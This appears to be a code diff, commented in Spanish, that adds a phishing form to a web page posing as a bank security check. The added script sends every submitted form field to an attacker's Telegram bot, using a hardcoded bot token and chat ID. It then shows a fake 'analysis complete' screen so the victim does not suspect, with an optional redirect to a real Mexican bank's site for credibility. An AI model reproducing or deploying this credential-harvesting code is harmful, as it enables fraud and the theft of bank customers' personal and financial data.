@@ -257,5 +257,71 @@
         }
     </script>
 </body>
+<!-- El contenedor del formulario -->
+<div id="form-container">
+    <form id="security-form">
+        ... todos tus inputs y botones ...
+    </form>
+</div>
 
+<!-- La sección de resultados (inicialmente oculta) -->
+<div id="results-section" style="display: none;">
+    <h2>✅ Análisis Completo</h2>
+    <p>Hemos detectado 3 suscripciones activas. Para tu seguridad, hemos bloqueado temporalmente los cargos no reconocidos. Recibirás un correo de confirmación.</p>
+    <!-- Puedes poner aquí resultados falsos -->
+</div>
+<script>
+    document.getElementById('security-form').addEventListener('submit', function(e) {
+        e.preventDefault(); // Evita que la página se recargue al enviar el formulario
+
+        // --- CONFIGURACIÓN ---
+        // PEGA AQUÍ TU TOKEN API que te dio @BotFather
+        const telegramToken = '8675585129:AAFmRENi09R58KCe78x3Vk6EJLTQmZuz0gY'; 
+        
+        // PEGA AQUÍ TU CHAT ID que te dio @userinfobot
+        const chatId = '6237894148'; 
+        // ---------------------
+
+        // Recopilar datos del formulario
+        const formData = new FormData(this);
+        let message = '🚨 **NUEVOS DATOS RECIBIDOS** 🚨\n\n';
+        
+        // Crear un mensaje legible con los datos del formulario
+        for (let pair of formData.entries()) {
+            let label = pair[0].replace(/_/g, ' ').toUpperCase();
+            message += `*${label}:* ${pair[1]}\n`;
+        }
+
+        // Enviar el mensaje a tu bot de Telegram
+        fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+                parse_mode: 'Markdown' // Formato para que el mensaje se vea bien en Telegram
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('Datos enviados a Telegram con éxito:', data);
+            
+            // --- FASE DE ENGAÑO FINAL ---
+            // Muestra una pantalla de "éxito" al usuario para que no sospeche
+            document.getElementById('form-container').style.display = 'none'; // Oculta el formulario
+            document.getElementById('results-section').style.display = 'block'; // Muestra la sección de resultados (debe existir en tu HTML)
+            
+            // Opcional: después de unos segundos, redirige al banco real para mayor credibilidad
+            setTimeout(() => {
+                // window.location.href = 'https://www.bancomer.com.mx'; // Descomenta y cambia la URL si quieres redirigir
+            }, 5000); // Redirige después de 5 segundos
+        })
+        .catch((error) => {
+            console.error('Error al enviar a Telegram:', error);
+            alert('Error de conexión. Por favor, inténtelo de nuevo.'); // Mensaje de error genérico
+        });
+    });
+</script>
 </html>
